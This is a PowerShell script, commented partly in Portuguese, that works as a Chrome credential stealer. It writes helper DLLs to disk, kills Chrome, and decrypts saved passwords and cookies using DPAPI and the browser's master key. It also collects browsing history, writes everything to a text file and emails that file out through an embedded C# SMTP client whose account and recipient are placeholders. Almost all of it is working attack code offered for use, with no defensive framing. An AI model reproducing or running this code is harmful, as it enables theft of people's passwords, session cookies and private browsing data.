Function Get-ChromeDump{

  
  
	$assemblyAes256Decrypt = ""

    #Add the required assembly for decryption

    Add-Type -Assembly System.Security

    #Check to see if the script is being run as SYSTEM. Not going to work.
    if(([System.Security.Principal.WindowsIdentity]::GetCurrent()).IsSystem){
      Write-Warning "Unable to decrypt passwords contained in Login Data file as SYSTEM."
      $NoPasswords = $True
    }

    if([IntPtr]::Size -eq 8)
    {
        #64 bit version
        $assembly = ""
    }
    else
    {
        #32 bit version
        $assembly = ""
    
    }
    #Unable to load this assembly from memory. The assembly was most likely not compiled using /clr:safe and contains unmanaged code. Loading assemblies of this type from memory will not work. Therefore we have to load it from disk.
    #DLL for sqlite queries and parsing
    #http://system.data.sqlite.org/index.html/doc/trunk/www/downloads.wiki
    Write-Verbose "[+]System.Data.SQLite.dll will be written to disk"
    
   
    $content = [System.Convert]::FromBase64String($assembly) 
    
    
    
    $assemblyPath = "$($env:LOCALAPPDATA)\System.Data.SQLite.dll" 
    
    
    if(Test-path $assemblyPath)
    {
      try 
      {
        Add-Type -Path $assemblyPath
      }
      catch 
      {
        Write-Warning "[!]Unable to load SQLite assembly"
        break
      }
    }
    else
    {
        [System.IO.File]::WriteAllBytes($assemblyPath,$content)
        Write-Verbose "[+]Assembly for SQLite written to $assemblyPath"
        try 
        {
            Add-Type -Path $assemblyPath
        }
        catch 
        {
            Write-Warning "[!]Unable to load SQLite assembly"
            break
        }
    }

    #open DescryptAes256

    $contentDescryptAes256 = [System.Convert]::FromBase64String($assemblyAes256Decrypt) 
			
			$assemblyPathZip = "$($env:LOCALAPPDATA)\Aes256Decrypt.zip" 
			
			$pathZipDestino = "$($env:LOCALAPPDATA)" 
			
			$pathDllDescryptAes256 = "$($env:LOCALAPPDATA)\Aes256Decrypt.dll" 
			
			if(Test-path $assemblyPathZip)
			{
			try 
			{
				Add-Type -Path $pathDllDescryptAes256      
				Write-Warning "[!]deu certo dll sem zip"
			}
			catch 
			{
				Write-Warning "[!]nao deu certo dll sem zip" + $pathDllDescryptAes256
				break
			}
			}
			else
			{
			[System.IO.File]::WriteAllBytes($assemblyPathZip,$contentDescryptAes256)
			$shell_app = new-object -com shell.application
			$zip_file = $shell_app.namespace($assemblyPathZip)
			$destination = $shell_app.namespace($pathZipDestino)
			$destination.Copyhere($zip_file.items())
			Write-Verbose "[+]Assembly for SQLite written to $assemblyPath"
				try 
				{
				Add-Type -Path $pathDllDescryptAes256         
				Write-Warning "[!]deu certo dll com zip"
				}
				catch 
				{
				Write-Warning "[!]nao deu certo dll com zip" + $pathDllDescryptAes256
				break
				}
			}

    #Check if Chrome is running. The data files are locked while Chrome is running 

    if(Get-Process | Where-Object {$_.Name -like "*chrome*"}){
      Write-Warning "[!]Stop Chrome"
      Stop-Process -Name chrome
    }

    #grab the path to Chrome user data
    $OS = [environment]::OSVersion.Version
    if($OS.Major -ge 6){
      $chromepath = "$($env:LOCALAPPDATA)\Google\Chrome\User Data\Default"
    }
    else{
      $chromepath = "$($env:HOMEDRIVE)\$($env:HOMEPATH)\Local Settings\Application Data\Google\Chrome\User Data\Default"
    }
    
    if(!(Test-path $chromepath)){
      Throw "Chrome user data directory does not exist"
    }
    else{
      #DB for CC and other info
      if(Test-Path -Path "$chromepath\Web Data"){$WebDatadb = "$chromepath\Web Data"}
      #DB for passwords 
      if(Test-Path -Path "$chromepath\Login Data"){$loginDatadb = "$chromepath\Login Data"}
      #DB for history
      if(Test-Path -Path "$chromepath\History"){$historydb = "$chromepath\History"}
      #$cookiesdb = "$chromepath\Cookies"
	    if(Test-Path -Path "$chromepath\Cookies"){$cookiesdb = "$chromepath\Cookies"}

    }

	if(!($NoPasswords)){ 

      #Parse the login data DB
      $connStr = "Data Source=$loginDatadb; Version=3;"

      $connection = New-Object System.Data.SQLite.SQLiteConnection($connStr)

      $OpenConnection = $connection.OpenAndReturn()

      Write-Verbose "Opened DB file $loginDatadb"

      $query = "SELECT * FROM logins;"

      $dataset = New-Object System.Data.DataSet

      $dataAdapter = New-Object System.Data.SQLite.SQLiteDataAdapter($query,$OpenConnection)

      [void]$dataAdapter.fill($dataset)

      $logins = @()

      # https://github.com/adobe/chromium/blob/master/webkit/forms/password_form.h#L45-L50
      $scheme_enum = @{0 = "HTML";1 = "BASIC";2 = "DIGEST"; 3 = "OTHER"}

      Write-Verbose "Parsing results of query $query"

      $dataset.Tables | Select-Object -ExpandProperty Rows | ForEach-Object {
        $encryptedBytes = $_.password_value
        $username = $_.username_value
        $action_url = $_.action_url
        $origin_url = $_.origin_url
        $scheme = $scheme_enum[[int]$_.scheme]

        $bytes = [byte[]]$encryptedBytes	
		
		if ($bytes -and ([string]::new($bytes[0..2]) -eq 'v10' -or [string]::new($bytes[0..2]) -eq 'v11')){
			
			$localStateInfo = Get-Content -Raw ("$($env:LOCALAPPDATA)\Google\Chrome\User Data\Local State") | ConvertFrom-Json
			  if ($localStateInfo) {$encryptedkey = [convert]::FromBase64String($localStateInfo.os_crypt.encrypted_key)}
			  if ($encryptedkey -and [string]::new($encryptedkey[0..4]) -eq 'DPAPI') {
			    $masterKey = [Security.Cryptography.ProtectedData]::Unprotect(($encryptedkey | Select-Object -Skip 5), $null, 'CurrentUser')
			  } 

			  $cchapcompilado = New-Object Aes256Decrypt.Aes256
			  $senha = $cchapcompilado.DescryptAes256([byte[]]$masterKey, [byte[]]$bytes)
    }else{			
			  $decryptedBytes = [Security.Cryptography.ProtectedData]::Unprotect($encryptedBytes, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
			  $plaintext = [System.Text.Encoding]::ASCII.GetString($decryptedBytes)
			  $senha = $plaintext 
		}	
        

        $login = New-Object PSObject -Property @{
          ORIGIN_URL = $origin_url
          ACTION_URL = $action_url
	        PWD_CRIPTOGRAFADO = [string]::new($bytes)
		      KEY = [string]::new($masterKey)
          PWD = $senha
          USER = $username
          SCHEME = $scheme          
        }

        $logins += $login
      }
    } 

    if(!($NoPasswords)){ 

      #Parse the login data DB
      $connStr = "Data Source=$cookiesdb; Version=3;"

      $connection = New-Object System.Data.SQLite.SQLiteConnection($connStr)

      $OpenConnection = $connection.OpenAndReturn()

      Write-Verbose "Opened DB file $cookiesdb"

      $query = "SELECT * FROM cookies;"

      $dataset = New-Object System.Data.DataSet

      $dataAdapter = New-Object System.Data.SQLite.SQLiteDataAdapter($query,$OpenConnection)

      [void]$dataAdapter.fill($dataset)

      $cookies = @()

      Write-Verbose "Parsing results of query $query"

      $dataset.Tables | Select-Object -ExpandProperty Rows | ForEach-Object {
        $encryptedBytesValue = $_.encrypted_value
		    $valueCokies = $_.value
		    $name = $_.name
        $domin_url = $_.host_key
        $path_url = $_.path  
		
        

        $bytesCokies = [byte[]]$encryptedBytesValue	
		
		if ($bytesCokies -and ([string]::new($bytesCokies[0..2]) -eq 'v10' -or [string]::new($bytesCokies[0..2]) -eq 'v11')){
			
			$localStateInfo = Get-Content -Raw ("$($env:LOCALAPPDATA)\Google\Chrome\User Data\Local State") | ConvertFrom-Json
			  if ($localStateInfo) {$encryptedkey = [convert]::FromBase64String($localStateInfo.os_crypt.encrypted_key)}
			  if ($encryptedkey -and [string]::new($encryptedkey[0..4]) -eq 'DPAPI') {
			    $masterKeyCokies = [Security.Cryptography.ProtectedData]::Unprotect(($encryptedkey | Select-Object -Skip 5), $null, 'LocalMachine')
			  } 

			  $cchapcompilado = New-Object Aes256Decrypt.Aes256
			  $senhaCokies = $cchapcompilado.DescryptAes256([byte[]]$masterKeyCokies, [byte[]]$bytesCokies)
    }else{			
			  $decryptedBytes = [Security.Cryptography.ProtectedData]::Unprotect($encryptedBytes, $null, [Security.Cryptography.DataProtectionScope]::LocalMachine)
			  $plaintext = [System.Text.Encoding]::ASCII.GetString($decryptedBytes)
			  $senhaCokies = $plaintext 
		}				
	
		
        $cookie = New-Object PSObject -Property @{
          PATH_URL = $path_url
          DOMIN_URL = $domin_url
          VALUE = $senhaCokies
          NAME = $name       
          VALUECookies = $valueCokies  
        }
        $cookies += $cookie
      }
    }
	

    #Parse the History DB
    $connString = "Data Source=$historydb; Version=3;"

    $connection = New-Object System.Data.SQLite.SQLiteConnection($connString)

    $Open = $connection.OpenAndReturn()

    Write-Verbose "Opened DB file $historydb"

    $DataSet = New-Object System.Data.DataSet

    $query = "SELECT * FROM urls;"

    $dataAdapter = New-Object System.Data.SQLite.SQLiteDataAdapter($query,$Open)

    [void]$dataAdapter.fill($DataSet)

    $History = @()
    $dataset.Tables | Select-Object -ExpandProperty Rows | ForEach-Object {
      $HistoryInfo = New-Object PSObject -Property @{
        Title = $_.title 
        URL = $_.url
      }
      $History += $HistoryInfo
    }
	
	if (!(Test-path -Path "C:\l")){
	New-Item -Path 'C:\l' -ItemType Directory
	}
    # Local do Arquivo de Saida
    $OutFile = 'C:\l\Chrome80Dump.txt'
	
    "[*]LOGINS`n" | Out-File $OutFile 
    $logins | Out-File $OutFile -Append

    "[*]HISTORY`n" | Out-File $OutFile -Append
    $History | Out-File $OutFile -Append 		
	
	"[*]cookies`n" | Out-File $OutFile -Append
    $cookies | Out-File $OutFile -Append  

	$metodoEmail = @'
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Mail;
using System.Text;
using System.Threading.Tasks;

namespace EnviaEmail
{
    public class Email
    {

        private static string _usuario = "USUARIO DO EMAIL"; //ALTERE
        private static string _senha = "SENHA DO EMAIL"; //ALTERE
        private static string _smtp = "SMTP"; //ALTERE
        private static int _porta = PORTA; //ALTERE


        public bool Enviar(string NomeDe, string EmailDe, string EmailPara, string Assunto, string Conteudo, string anexo)
        {
            MailMessage mail = new MailMessage();
            SmtpClient smtp = new SmtpClient();

            try
            {
                mail.From = new MailAddress(NomeDe + "<" + EmailDe + ">");

                string[] ArrEmailPara = EmailPara.Split(';');

                foreach (string Email in ArrEmailPara)
                    mail.To.Add(new MailAddress(Email));

                mail.Subject = Assunto;
                mail.IsBodyHtml = true;
                mail.Body = Conteudo;
                mail.Attachments.Add(new Attachment(anexo));


				smtp.Timeout = 200000;
                smtp.UseDefaultCredentials = false;
                smtp.EnableSsl = true;
                smtp.Credentials = new System.Net.NetworkCredential(_usuario, _senha);
                smtp.Host = _smtp;
                smtp.Port = _porta;

                //envia email
                smtp.Send(mail);

                return true;
            }
            catch (Exception error)
            {
                throw error;
            }
            finally
            {
                mail.Dispose();
            }
        }
    }
}
'@
Add-Type -TypeDefinition $metodoEmail

$EnviaEmail = New-Object EnviaEmail.Email
$EnviaEmail.Enviar("NOME DO REMETENTE", "REMETENTE", "DESTINATÁRIO", "ASSUNTO", "TEXTO DO EMAIL", $OutFile)

Write-Warning "[!] Please remove SQLite assembly from here: $assemblyPath"  
    
}

Get-ChromeDump



